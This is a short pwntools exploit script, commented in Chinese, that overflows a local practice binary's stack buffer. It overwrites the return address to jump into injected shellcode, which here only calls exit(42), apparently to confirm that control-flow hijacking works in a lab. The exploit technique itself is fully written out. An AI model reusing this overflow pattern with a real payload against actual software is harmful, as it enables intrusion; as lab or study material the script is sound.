# final_verification_exploit.py
from pwn import *

# --- 配置 ---
TARGET_BINARY = './sbofsc_no_cet'
TARGET_ADDR = 0x20000
OFFSET = 72
PADDING = b'A' * OFFSET

context(arch='amd64', os='linux', log_level='info')

try:
    p = process(TARGET_BINARY, env={'MRND': '0'})

    # 1. 注入一个“以退出码 42 退出”的 Shellcode
    # mov rax, 60  (sys_exit 的系统调用号)
    # mov rdi, 42  (exit 的第一个参数，即退出码)
    # syscall      (执行系统调用)
    log.info("Crafting shellcode to force exit(42)")
    shellcode = asm('mov rax, 60; mov rdi, 42; syscall')
    
    p.sendlineafter(b"what's your name: \n", shellcode)

    # 2. 构造并发送溢出 Payload
    payload = PADDING + p64(TARGET_ADDR)
    log.info("Sending overflow payload to trigger exit(42)")
    p.sendlineafter(b"try to overflow me~\n", payload)

    # 3. 等待进程结束
    # 这个 shellcode 不会产生任何输出，我们只关心它的退出码
    p.wait_for_close()
    log.success("Process finished.")

except Exception as e:
    log.error(f"An error occurred: {e}")